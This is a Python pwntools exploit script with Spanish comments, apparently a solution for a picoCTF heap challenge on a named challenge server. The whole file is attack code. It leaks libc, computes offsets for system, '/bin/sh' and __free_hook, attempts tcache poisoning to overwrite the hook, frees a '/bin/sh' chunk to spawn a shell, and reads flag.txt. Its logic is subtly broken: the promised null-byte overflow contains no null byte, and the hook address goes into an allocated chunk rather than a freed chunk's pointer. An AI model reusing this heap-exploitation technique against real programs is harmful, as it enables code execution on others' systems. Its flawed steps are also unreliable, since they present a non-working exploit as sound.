#!/usr/bin/env python3

from pwn import *

HOST = 'jupiter.challenges.picoctf.org'
PORT = 29476

def exploit():
    p = remote(HOST, PORT)
    
    # Diálogo inicial
    p.recvuntil(b'From Zero to Hero')
    p.sendline(b'y')
    p.recvuntil(b'Really?')
    p.sendline(b'y')
    
    # Leak de libc
    p.recvuntil(b'Take this: ')
    leak = p.recvline().strip()
    leak_addr = int(leak, 16)
    log.info(f"Leaked: 0x{leak_addr:x}")
    
    libc_base = leak_addr - 0x21fd0
    log.info(f"Libc base: 0x{libc_base:x}")
    
    # Direcciones importantes
    system = libc_base + 0x4f4e0
    binsh = libc_base + 0x1b40fa
    free_hook = libc_base + 0x1e75a8
    malloc_hook = libc_base + 0x1e4c30
    one_gadget = libc_base + 0x4f432
    
    p.recvuntil(b'>')
    
    # Estrategia: Null byte poisoning
    # Crear 2 superpoderes con tamaño específico
    
    # Chunk 1 - tamaño 0x100
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'248')  # 0xf8 + 8 = 0x100
    p.recvuntil(b'description')
    p.sendline(b'A' * 248)
    p.recvuntil(b'>')
    
    # Chunk 2 - tamaño 0x100  
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'248')
    p.recvuntil(b'description')
    p.sendline(b'B' * 248)
    p.recvuntil(b'>')
    
    # Chunk 3 - prevenir consolidación
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'16')
    p.recvuntil(b'description')
    p.sendline(b'C' * 16)
    p.recvuntil(b'>')
    
    # Free chunk 2 (va a tcache)
    p.sendline(b'2')
    p.recvuntil(b'remove')
    p.sendline(b'1')
    p.recvuntil(b'>')
    
    # Free chunk 1 (va a tcache)
    p.sendline(b'2')
    p.recvuntil(b'remove')
    p.sendline(b'0')
    p.recvuntil(b'>')
    
    # Ahora tcache[0x100] = chunk1 -> chunk2 -> NULL
    
    # Allocar de nuevo con null byte overflow
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'248')
    p.recvuntil(b'description')
    
    # Payload con null byte para corromper el size del siguiente chunk
    payload = b'D' * 248
    p.send(payload)
    p.recvuntil(b'>')
    
    # Allocar el segundo chunk del tcache
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'248')
    p.recvuntil(b'description')
    
    # Este payload sobrescribe el fd pointer
    payload = p64(free_hook)
    payload += b'E' * (248 - 8)
    p.send(payload)
    p.recvuntil(b'>')
    
    # Allocar una vez más para obtener un chunk en free_hook
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'248')
    p.recvuntil(b'description')
    p.sendline(b'F' * 248)
    p.recvuntil(b'>')
    
    # Ahora el siguiente alloc será en free_hook
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'8')
    p.recvuntil(b'description')
    p.send(p64(system))  # Sobrescribir free_hook con system
    p.recvuntil(b'>')
    
    # Crear un chunk con "/bin/sh"
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'8')
    p.recvuntil(b'description')
    p.send(b'/bin/sh\x00')
    p.recvuntil(b'>')
    
    # Free el chunk con "/bin/sh" -> system("/bin/sh")
    p.sendline(b'2')
    p.recvuntil(b'remove')
    p.sendline(b'7')
    
    # Shell!
    p.sendline(b'cat flag.txt')
    
    try:
        response = p.recvall(timeout=2)
        if b'picoCTF' in response:
            flag_start = response.index(b'picoCTF')
            flag_end = response.index(b'}', flag_start) + 1
            flag = response[flag_start:flag_end].decode()
            log.success(f"FLAG: {flag}")
        else:
            log.info("Going interactive...")
            p.interactive()
    except:
        p.interactive()

if __name__ == "__main__":
    context.log_level = 'info'
    exploit()